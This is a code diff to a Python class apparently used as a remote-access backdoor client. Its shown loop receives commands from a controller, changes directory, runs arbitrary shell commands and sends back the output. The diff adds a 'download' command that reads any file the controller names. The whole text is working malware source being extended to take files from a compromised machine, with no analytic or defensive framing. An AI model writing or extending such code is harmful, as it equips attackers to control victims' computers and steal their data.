@@ -44,6 +44,10 @@ class ihsanbey:
         except Exception as e:
             return ("Beklenmedik bir hata oluştu: " + str(e)).encode('utf-8')
 
+    def read_file(self, path):
+        with open(path, "rb") as file: 
+            return file.read()
+
 
     def run(self):
         while True:
@@ -57,6 +61,10 @@ class ihsanbey:
                 path = " ".join(command.split(" ")[1:])
                 command_result =  self.change_dir(path)
                 self.reliable_send(command_result)
+
+            elif command.startswith("download "):
+                the_file = " ".join(command.split(" ")[1:])
+                command_result = self.read_file(the_file)
             else:
                 try:    
                     resultt = self.execute_command(command.encode("utf-8"))
